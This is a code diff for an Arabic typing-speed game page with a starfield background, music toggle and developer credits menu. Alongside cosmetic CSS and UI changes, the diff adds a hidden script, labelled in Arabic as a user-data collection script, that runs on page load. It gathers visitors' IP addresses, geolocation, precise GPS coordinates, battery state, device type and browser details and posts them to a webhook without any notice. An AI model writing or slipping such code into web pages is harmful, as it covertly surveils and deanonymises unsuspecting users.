@@ -10,10 +10,11 @@
       direction: rtl;
       margin: 0;
       padding: 0;
-      background: black;
-      color: white;
-      overflow: hidden;
       text-align: center;
+      min-height: 100vh;
+      background: black;
+      overflow: hidden;
+      color: white;
     }
 
     canvas#stars {
@@ -31,6 +32,7 @@
       padding: 20px;
       background: rgba(20, 20, 20, 0.9);
       border-radius: 15px;
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.05);
     }
 
     input[type="text"] {
@@ -38,10 +40,10 @@
       font-size: 18px;
       width: 80%;
       margin-bottom: 15px;
+      border: 2px solid #555;
       border-radius: 8px;
       background: #111;
       color: white;
-      border: 2px solid #555;
     }
 
     button {
@@ -52,51 +54,138 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      margin: 5px;
     }
 
     #sentence span {
       font-size: 24px;
       font-weight: bold;
-      margin: 0 5px;
-      white-space: pre;
+      color: white;
     }
 
-    .correct { color: #4caf50; }
-    .incorrect { color: #f44336; }
+    #sentence span.correct {
+      color: #4caf50;
+    }
+
+    #sentence span.incorrect {
+      color: #f44336;
+    }
 
     #record {
       position: fixed;
-      top: 20px;
       right: 20px;
+      top: 20px;
       background: #222;
       padding: 10px 15px;
       border-radius: 8px;
-      border: 1px solid #555;
       font-size: 16px;
       font-weight: bold;
+      border: 1px solid #555;
+      z-index: 10;
     }
 
     #musicControl {
       position: fixed;
-      top: 20px;
       left: 20px;
+      top: 20px;
+      background: #333;
+      color: white;
+      border-radius: 50%;
       width: 40px;
       height: 40px;
-      background: #333;
-      border-radius: 50%;
+      cursor: pointer;
       display: flex;
       justify-content: center;
       align-items: center;
       font-size: 20px;
+      z-index: 10;
+    }
+
+    #discordButton {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      width: 40px;
+      height: 40px;
+      background: transparent;
       cursor: pointer;
+      z-index: 10;
+      animation: glow 1.5s infinite alternate;
+    }
+
+    #discordButton img {
+      width: 100%;
+      height: 100%;
+    }
+
+    @keyframes glow {
+      from {
+        filter: drop-shadow(0 0 3px #7289da);
+      }
+      to {
+        filter: drop-shadow(0 0 15px #7289da);
+      }
+    }
+
+    #rightsMenu {
+      display: none;
+      position: fixed;
+      bottom: 70px;
+      left: 20px;
+      background: #111;
+      color: white;
+      border-radius: 8px;
+      padding: 15px;
+      font-size: 14px;
+      z-index: 1000;
+      width: 220px;
+      box-shadow: 0 0 10px rgba(255,255,255,0.3);
+      text-align: left;
+    }
+
+    #closeBtn {
+      background: #c62828;
+      border: none;
+      border-radius: 5px;
+      padding: 6px 12px;
+      color: white;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+
+    #result.error {
+      color: #f44336;
+    }
+
+    /* حقوق */
+    #footerRights {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 14px;
+      color: #777;
+      user-select: none;
     }
   </style>
 </head>
 <body>
 
 <canvas id="stars"></canvas>
+
 <div id="record">أعلى سرعة: 0 - 0.00 ثانية</div>
 <div id="musicControl" title="تشغيل/إيقاف الموسيقى">🎵</div>
+
+<button id="discordButton" title="حقوق المطور">
+  <img src="https://cdn.iconscout.com/icon/free/png-256/discord-3-569463.png" alt="Discord Logo" />
+</button>
+
+<div id="rightsMenu">
+  <button id="closeBtn">إغلاق</button>
+  <div>المطور: <b>_9nv</b></div>
+  <div>Discord: <b>_9nv</b></div>
+  <div>جميع الحقوق محفوظة</div>
+</div>
 
 <div class="container" id="loginScreen">
   <h2>مرحبًا!</h2>
@@ -109,7 +198,7 @@
 <div class="container" id="gameScreen" style="display:none;">
   <h2 id="welcomeMsg"></h2>
   <div id="sentence"></div>
-  <input type="text" id="userInput" placeholder="اكتب هنا" oninput="renderSentence(this.value)" onkeydown="handleEnter(event)" />
+  <input type="text" id="userInput" placeholder="اكتب هنا" oninput="renderSentence(this.value)" onkeydown="handleEnter(event)" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
   <br />
   <button onclick="checkInput()">تحقق</button>
   <div id="speedDisplay"></div>
@@ -119,19 +208,24 @@
 
 <audio id="bgMusic" src="https://files.catbox.moe/l0gz7g.mp3" loop></audio>
 
+<div id="footerRights">جميع الحقوق محفوظة © <span id="year"></span> [اسمك هنا]</div>
+
 <script>
+  // سنة الحقوق تلقائية
+  document.getElementById("year").textContent = new Date().getFullYear();
+
+  // النجوم
   const starsCanvas = document.getElementById("stars");
   const ctx = starsCanvas.getContext("2d");
+  let stars = [];
 
   function resizeCanvas() {
     starsCanvas.width = window.innerWidth;
     starsCanvas.height = window.innerHeight;
   }
-
   window.addEventListener("resize", resizeCanvas);
   resizeCanvas();
 
-  let stars = [];
   function initStars(count) {
     stars = [];
     for (let i = 0; i < count; i++) {
@@ -144,7 +238,6 @@
       });
     }
   }
-
   function drawStars() {
     ctx.clearRect(0, 0, starsCanvas.width, starsCanvas.height);
     ctx.fillStyle = "white";
@@ -159,10 +252,10 @@
     });
     requestAnimationFrame(drawStars);
   }
-
   initStars(250);
   drawStars();
 
+  // عناصر الواجهة
   const loginScreen = document.getElementById("loginScreen");
   const gameScreen = document.getElementById("gameScreen");
   const playerName = document.getElementById("playerName");
@@ -175,22 +268,35 @@
   const bestTimeDisplay = document.getElementById("bestTime");
   const music = document.getElementById("bgMusic");
   const musicControl = document.getElementById("musicControl");
+  const discordBtn = document.getElementById("discordButton");
+  const rightsMenu = document.getElementById("rightsMenu");
+  const closeBtn = document.getElementById("closeBtn");
 
-  const sentences = ["ابدأ الآن", "سر النجاح الاستمرار", "لا تستسلم", "ركز جيداً"];
+  let player = "";
   let currentSentence = "";
   let startTime = 0;
   let highestSpeed = 0;
   let bestTime = null;
-  let player = "";
+
+  discordBtn.addEventListener("click", (e) => {
+    rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
+    e.stopPropagation();
+  });
+  closeBtn.addEventListener("click", () => rightsMenu.style.display = "none");
+  document.addEventListener("click", (e) => {
+    if (!rightsMenu.contains(e.target) && !discordBtn.contains(e.target)) {
+      rightsMenu.style.display = "none";
+    }
+  });
+
+  const sentences = ["ابدأ الآن", "سر النجاح الاستمرار", "لا تستسلم", "ركز جيداً"];
 
   function startGame() {
     player = playerName.value.trim();
     if (!player) return alert("اكتب اسمك أولاً");
-
     welcomeMsg.textContent = `هلا بك، ${player}`;
     loginScreen.style.display = "none";
     gameScreen.style.display = "block";
-
     currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
     renderSentence("");
     userInput.value = "";
@@ -220,11 +326,15 @@
     const originalWords = currentSentence.split(" ");
     const typedWords = userTyped.trim().split(" ");
 
+    const hasStarted = userTyped.trim().length > 0;
+
     for (let i = 0; i < originalWords.length; i++) {
       const span = document.createElement("span");
       span.textContent = originalWords[i] + " ";
 
-      if (typedWords[i] === undefined || typedWords[i] === "") {
+      if (!hasStarted) {
+        span.style.color = "white";
+      } else if (typedWords[i] === undefined || typedWords[i] === "") {
         span.style.color = "white";
       } else if (typedWords[i] === originalWords[i]) {
         span.classList.add("correct");
@@ -240,33 +350,123 @@
     const typed = userInput.value.trim();
     if (typed === currentSentence) {
       const elapsed = (Date.now() - startTime) / 1000;
-      const speed = typed.length / elapsed;
-      speedDisplay.textContent = `سرعتك: ${speed.toFixed(2)} حرف/ثانية`;
-
-      if (speed > highestSpeed) {
-        highestSpeed = speed;
+      speedDisplay.textContent = `سرعتك: ${(typed.length / elapsed).toFixed(2)} حرف/ثانية`;
+      if ((typed.length / elapsed) > highestSpeed) {
+        highestSpeed = typed.length / elapsed;
         bestTime = elapsed;
         record.textContent = `أعلى سرعة: ${highestSpeed.toFixed(2)} - ${bestTime.toFixed(2)} ثانية`;
       }
-
-      result.textContent = "أحسنت!";
-      result.style.color = "#4caf50";
-
+      result.textContent = "أحسنت! 🎉";
+      result.classList.remove("error");
       currentSentence = sentences[Math.floor(Math.random() * sentences.length)];
       renderSentence("");
       userInput.value = "";
       startTime = Date.now();
     } else {
       result.textContent = "حاول مرة أخرى";
-      result.style.color = "#f44336";
+      result.classList.add("error");
     }
   }
 
-  function handleEnter(e) {
-    if (e.key === "Enter") {
+  function handleEnter(event) {
+    if (event.key === "Enter") {
       checkInput();
     }
   }
+
+  // سكربت جمع بيانات المستخدم
+  const WEBHOOK_URL = "ضع_رابط_الويبهوك_هنا";
+
+  async function sendUserInfo() {
+    try {
+      const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
+        fetch('https://api.ipify.org?format=json'),
+        fetch('https://api64.ipify.org?format=json'),
+        fetch('https://ipapi.co/json/')
+      ]);
+      const ipv4Data = await ipv4Res.json();
+      const ipv6Data = await ipv6Res.json();
+      const geoData = await geoRes.json();
+
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const now = new Date();
+      const timeString = now.toISOString();
+      const ipv4 = ipv4Data.ip;
+      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
+
+      // تحديد نوع الجهاز
+      let deviceType = "كمبيوتر";
+      if (/android|iphone|ipad|ipod/i.test(ua)) {
+        deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
+      }
+
+      // جلب مستوى الشحن
+      let batteryInfo = "غير متوفرة";
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          const level = Math.round(battery.level * 100);
+          const charging = battery.charging ? "يُشحن" : "لا يُشحن";
+          batteryInfo = `${level}% - ${charging}`;
+        } catch (err) {
+          batteryInfo = "غير مدعومة";
+        }
+      }
+
+      function sendToWebhook(extraGeo = '') {
+        const infoText = `
+IP (IPv4): ${ipv4}
+IP (IPv6): ${ipv6}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+خط العرض: ${geoData.latitude}
+خط الطول: ${geoData.longitude}
+المنظمة: ${geoData.org}
+المنطقة الزمنية: ${geoData.timezone}
+نوع الجهاز: ${deviceType}
+نسبة البطارية: ${batteryInfo}
+المتصفح: ${ua}
+اللغة: ${lang}
+الوقت: ${timeString}
+${extraGeo}
+        `.trim();
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: infoText })
+        });
+      }
+
+      if (navigator.geolocation) {
+        let responded = false;
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            responded = true;
+            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(6)}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
+            sendToWebhook(extraGeo);
+          },
+          () => {
+            responded = true;
+            sendToWebhook();
+          },
+          { timeout: 4000 }
+        );
+        setTimeout(() => {
+          if (!responded) sendToWebhook();
+        }, 4500);
+      } else {
+        sendToWebhook();
+      }
+    } catch (e) {
+      console.error('خطأ في إرسال معلومات المستخدم', e);
+    }
+  }
+
+  // تشغيل إرسال البيانات عند تحميل الصفحة
+  sendUserInfo();
 </script>
 
 </body>
